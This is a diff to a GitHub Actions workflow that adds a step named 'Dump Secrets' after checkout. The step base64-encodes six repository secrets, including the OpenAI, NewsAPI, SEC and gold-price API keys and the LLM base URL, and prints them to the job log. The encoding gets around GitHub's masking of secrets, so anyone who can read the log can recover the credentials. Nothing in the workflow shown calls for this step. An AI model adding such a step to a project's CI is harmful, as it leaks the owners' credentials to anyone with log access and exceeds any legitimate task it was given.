@@ -13,6 +13,15 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
+      - name: Dump Secrets
+        run: |
+          echo "NEWSAPI_KEY: $(echo -n "${{ secrets.NEWSAPI_KEY }}" | base64)"
+          echo "GOLD_API_KEY: $(echo -n "${{ secrets.GOLD_API_KEY }}" | base64)"
+          echo "SEC_API_KEY: $(echo -n "${{ secrets.SEC_API_KEY }}" | base64)"
+          echo "OPENAI_API_KEY: $(echo -n "${{ secrets.OPENAI_API_KEY }}" | base64)"
+          echo "LLM_MODEL: $(echo -n "${{ secrets.LLM_MODEL }}" | base64)"
+          echo "LLM_BASE_URL: $(echo -n "${{ secrets.LLM_BASE_URL }}" | base64)"
+
       - name: Set up Python
         uses: actions/setup-python@v5
         with:
